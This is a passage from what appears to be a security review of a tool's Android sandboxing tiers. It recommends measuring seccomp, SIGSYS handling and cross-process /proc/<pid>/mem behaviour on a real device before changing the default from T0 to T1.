**3. Measure the phone, and let the transcript decide what the phone tier says.** Everything above is accessory-only. The mechanism argument for Android is strong — `seccomp` has been on bionic's app allowlist since 8.0 — and it is still an argument. Run `--probe` on the actual device, attach the transcript, and let it settle four open questions no source read can: whether `seccomp(2)` is still allowlisted on that release, whether the SIGSYS handler catches what the platform filter throws, whether `/proc/<pid>/mem` crosses between Termux processes under SELinux, and whether the D5 `/bin/sh` hardcode breaks every T1 Bash call. Only after that does the default move off T0 — and it moves one step, to T1, with the string that says it is not a sandbox.

---

*Written 2026-08-05 against commit `349e23d`. All measurements reproducible on the accessory node; verification scripts left at `/root/verify-adv-2026.sh` and `/root/verify-inject.sh` in WSL Ubuntu. Nothing in `/root/atlan` or `/root/atlan-security` was touched.*
